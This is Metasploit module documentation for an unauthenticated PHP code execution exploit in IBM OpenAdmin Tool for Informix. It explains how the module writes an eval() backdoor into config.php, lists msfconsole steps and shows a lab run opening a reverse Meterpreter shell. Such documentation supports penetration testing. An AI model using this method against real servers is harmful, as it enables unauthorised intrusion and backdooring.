## Description

  This module exploits an unauthenticated remote PHP code execution vulnerability in [IBM OpenAdmin Tool](https://www.ibm.com/support/knowledgecenter/SSGU8G_12.1.0/com.ibm.oat.doc/ids_oat.htm) included with IBM Informix versions 11.5, 11.7, and 12.1.

  The *welcomeServer* SOAP service does not properly validate user input in the *new_home_page* parameter of the *saveHomePage* method allowing arbitrary PHP code to be written to the *config.php* file. The *config.php* file is executed in most pages within the application, and accessible directly via the web root, resulting in code execution.

  **Note: If malformed PHP code is written to the *config.php* file the application fails to process subsequent requests to set *new_home_page*, rendering the application unexploitable.**

  For this reason, the module first writes a PHP `eval()` backdoor to the *config.php* file, then the payload is provided as PHP code in a HTTP POST request for execution.

  By default, a backup of the existing *config.php* is written to *BAKconfig.php*. Replacing the *config.php* file with *BAKconfig.php* will remove the backdoor.


## Vulnerable Application

  The IBM&reg; OpenAdmin Tool (OAT) for Informix&reg; is a web application for administering and analyzing the performance of IBM Informix database servers. You can administer multiple database server instances from a single OAT installation on a web server. You can access the web server through any browser to administer all your database servers.

  This module has been tested successfully on IBM OpenAdmin Tool 3.14 on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.

  * [Informix 12.10 Developer Edition SLES 11 virtual appliance demo (Developer Edition 32 bit) VMware Workstation](https://www-01.ibm.com/marketing/iwm/iwm/web/reg/download.do?source=swg-informixfpd&S_PKG=dl&lang=en_US&cp=UTF-8&dlmethod=http)


## Verification Steps

  1. Start `msfconsole`
  2. Do: `exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec`
  3. Do: `set rhost [IP]`
  4. Do: `run`
  5. You should get a session


## Scenarios

### IBM OpenAdmin Tool 3.14 on Informix 12.10 Developer Edition (SUSE Linux 11) Virtual Appliance

  ```
  msf exploit(ibm_openadmin_tool_soap_welcomeserver_exec) > check
  [*] 172.16.191.208:80 The target service is running, but could not be validated.
  msf exploit(ibm_openadmin_tool_soap_welcomeserver_exec) > run

  [*] Started reverse TCP handler on 172.16.191.181:4444 
  [+] 172.16.191.208:80 Wrote backdoor to config.php file successfully
  [*] Sending stage (33986 bytes) to 172.16.191.208
  [*] Meterpreter session 1 opened (172.16.191.181:4444 -> 172.16.191.208:39840) at 2017-05-31 08:01:49 -0400
  [!] 172.16.191.208:80 Replace the 'config.php' file with 'BAKconfig.php' to remove the backdoor

  meterpreter > sysinfo
  Computer    : informixva
  OS          : Linux informixva 2.6.27.39-0.3-vmi #1 SMP 2009-11-23 12:57:38 +0100 i686
  Meterpreter : php/linux
  meterpreter > getuid 
  Server username: daemon (2)
  meterpreter > 
  ```

